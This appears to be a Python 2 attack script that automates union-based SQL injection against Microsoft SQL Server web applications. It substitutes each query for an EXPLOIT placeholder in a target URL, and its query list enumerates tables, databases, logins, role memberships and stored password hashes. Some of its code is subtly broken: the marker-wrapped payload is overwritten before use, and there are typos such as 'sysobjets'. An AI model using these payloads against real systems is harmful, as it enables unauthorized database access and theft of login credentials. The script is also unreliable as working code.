#!/usr/bin/env python

import sys
import urllib
import urllib2
import re
import pprint
import json

queries = (
    'TOP 1 name FROM (SELECT TOP 1 name FROM master..sysobjects WHERE xtype = CHAR(55) ORDER BY NAME ASC) sq ORDER BY name DESC', # list tables
    'name FROM master..sysobjects WHERE xtype = CHAR(55)', # list tables
    'CAST(424242 as char)',
    '@@version',
    '@@SPID',
    'user_name()',
    'user',
    'system_user',
    'loginname FROM master..sysprocesses WHERE spid = @@SPID',
    'name FROM master..syslogins',
    'name FROM master..sysxlogins',
    'password FROM master..sysxlogins',
    'master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins',
    'name FROM master.sys.sql_logins',
    'password_hash FROM master.sys.sql_logins',
    'master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins',
    'permission_name FROM master..fn_my_permissions(null, "DATABASE")',
    'permission_name FROM master..fn_my_permissions(null, "SERVER")',
    'permission_name FROM master..fn_my_permissions("master..syslogins", "OBJECT")',
    'permission_name FROM master..fn_my_permissions("sa", "USER")',
    'CAST(is_srvrolemember("sysadmin") as char)',
    'is_srvrolemember("dbcreator")',
    'is_srvrolemember("bulkadmin")',
    'is_srvrolemember("diskadmin")',
    'is_srvrolemember("processadmin")',
    'is_srvrolemember("serveradmin")',
    'is_srvrolemember("setupadmin")',
    'is_srvrolemember("securityadmin")',
    'name from master..syslogins where denylogin = 0',
    'name from master..syslogins where hasaccess = 1',
    'name from master..syslogins where isntname = 0',
    'name from master..syslogins where isntgroup = 0',
    'name from master..syslogins where sysadmin = 1',
    'name from master..syslogins where securityadmin = 1',
    'name from master..syslogins where serveradmin = 1',
    'name from master..syslogins where setupadmin = 1',
    'name from master..syslogins where processadmin = 1',
    'name from master..syslogins where diskadmin = 1',
    'name from master..syslogins where bulkadminadmin = 1',
    'is_srvrolemember("sysadmin")',
    'is_srvrolemember("bulkadmin")',
    'is_srvrolemember("systemadmin")',
    'is_srvrolemember("serveradmin")',
    'is_srvrolemember("serveradmin", "sa")',
    'DB_NAME()',
    'name FROM master..sysdatabases',
    'DB_NAME(1)',
    'DB_NAME(2)',
    'DB_NAME(3)',
    'DB_NAME(4)',
    'DB_NAME(5)',
    'DB_NAME(6)',
    'DB_NAME(7)',
    'DB_NAME(8)',
    'DB_NAME(9)',
    'DB_NAME(10)',
    'DB_NAME(11)',
    'DB_NAME(12)',
    'DB_NAME(13)',
    'DB_NAME(14)',
    'DB_NAME(15)',
    'DB_NAME(16)',
    'DB_NAME(17)',
    'name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = "MYTABLE")', # list columns
    'master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master.syscolumns, master..sysobjects WHERE master.syscolumns.id=master..sysobjets.id AND master..sysobjects.name = "MYTABLE"', #list columns
    'name FROM master..sysobjects WHERE xtype = "V"', # list views
    'TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC', # gets 9th row
    'substring("abcd",3,1)', #returns c
    'IF (1=1) SELECT CAST(1 as char) ELSE SELECT CAST(2 as char)',
    'HOST_NAME()',
)

def str_sql(string):
    out = ''
    for c in string:
        out += 'CHAR(%d)+' % ord(c)
    return out[:-1]

# http://hostname/path/default.cfm?cat=-1+union+all+select+1,(select+EXPLOIT),1,1,1+--+
if __name__ == "__main__":
    base_url = sys.argv[1]

    i = 0
    ret = {}
    for query in queries:
        before = '1234567890'
        after = '0987654321'
        #payload = '((SELECT CAST(%d as char)) + (SELECT CAST((select %s as char))) + (SELECT CAST(%d as char)))' % (before, query, after)
        #payload = '(SELECT %s)' % (query)
        #payload = query
        #payload = '(%s+(SELECT %s)+%s)' % (str_sql(before), query, str_sql(after))
        #payload = '(SELECT CHAR(65) + CHAR(65) + (SELECT @@version))'
        #payload = '(CHAR(65) + CHAR(65) + (SELECT @@version))'
        #payload = '(SELECT %s + (SELECT %s))'
        payload = '(%s+(SELECT %s)+%s)' % (str_sql(before), query, str_sql(after))
        payload = '((SELECT %s))' % query
        url = base_url.replace('EXPLOIT', urllib.quote(payload))
        print i, url
        h = urllib2.urlopen(url)
        c = h.read()
        ret[query] = re.findall('%s(.*?)%s' % (before, after), c, re.S)
        print i, query, ret[query]
        #print c
        i += 1
        #if i == 3:
        #    break
print
pprint.pprint(ret)
print
print json.dumps(ret)
